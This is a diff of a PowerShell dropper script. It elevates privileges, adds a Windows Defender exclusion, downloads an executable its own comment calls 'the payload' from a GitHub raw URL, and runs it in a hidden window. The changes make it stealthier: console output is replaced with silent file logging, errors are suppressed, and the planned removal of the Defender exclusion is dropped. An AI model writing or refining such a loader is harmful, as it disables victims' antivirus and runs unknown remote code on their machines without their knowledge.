@@ -1,16 +1,14 @@
 param(
     [string]$OriginalTemp = $env:TEMP,
     [string]$FileName = "cf.exe",
-    [string]$RepoUrl = "https://github.com/monkbytting/client/blob/main/Cbuilt.exe"
+    [string]$RepoUrl = "https://github.com/monkbytting/client/raw/main"
 )
 
-# Function to log messages (optional file logging)
+# Silent logging to file only (no console output)
 function Write-Log {
     param([string]$Message)
     $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
-    Write-Output "[$timestamp] $Message"
-    # Optional: Add to a log file
-    # Add-Content -Path "$env:TEMP\runner.log" -Value "[$timestamp] $Message"
+    Add-Content -Path "$env:TEMP\runner.log" -Value "[$timestamp] $Message" -ErrorAction SilentlyContinue
 }
 
 # Check for admin privileges and elevate if needed
@@ -32,8 +30,8 @@ if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdenti
 try {
     Write-Log "Starting execution..."
 
-    # Resolve and validate output path
-    $output = Join-Path $OriginalTemp $FileName -Resolve
+    # Define output path (no -Resolve since file doesn’t exist yet)
+    $output = Join-Path $OriginalTemp $FileName
     $outputDir = Split-Path $output -Parent
     Write-Log "Target path: $output"
 
@@ -46,32 +44,24 @@ try {
     # Add Windows Defender exclusion (only if necessary)
     if ((Get-MpPreference).ExclusionPath -notcontains $output) {
         Write-Log "Adding exclusion to Windows Defender: $output"
-        Add-MpPreference -ExclusionPath $output -ErrorAction Stop
+        Add-MpPreference -ExclusionPath $output -ErrorAction SilentlyContinue
     }
 
-    # Download the executable
-    $downloadUrl = "$RepoUrl/$FileName"
+    # Download the payload (Cbuilt.exe)
+    $downloadUrl = "$RepoUrl/Cbuilt.exe"  # Fixed to use the specific payload name
     Write-Log "Downloading from: $downloadUrl"
     $ProgressPreference = 'SilentlyContinue'
-    Invoke-WebRequest -Uri $downloadUrl -OutFile $output -TimeoutSec 30 -ErrorAction Stop
+    Invoke-WebRequest -Uri $downloadUrl -OutFile $output -TimeoutSec 30 -ErrorAction SilentlyContinue
 
-    # Verify file exists and is valid
+    # Verify and execute
     if (Test-Path $output) {
         Write-Log "File downloaded successfully, executing: $output"
-        Start-Process -FilePath $output -WindowStyle Hidden -ErrorAction Stop
+        Start-Process -FilePath $output -WindowStyle Hidden -ErrorAction SilentlyContinue
     }
     else {
-        throw "Downloaded file not found at: $output"
+        Write-Log "Download failed, file not found at: $output"
     }
-
-    Write-Log "Execution completed successfully."
 }
 catch {
     Write-Log "Error occurred: $_"
-    exit 1
-}
-finally {
-    # Optional cleanup (e.g., remove Defender exclusion)
-    # Write-Log "Cleaning up Defender exclusion..."
-    # Remove-MpPreference -ExclusionPath $output -ErrorAction SilentlyContinue
 }
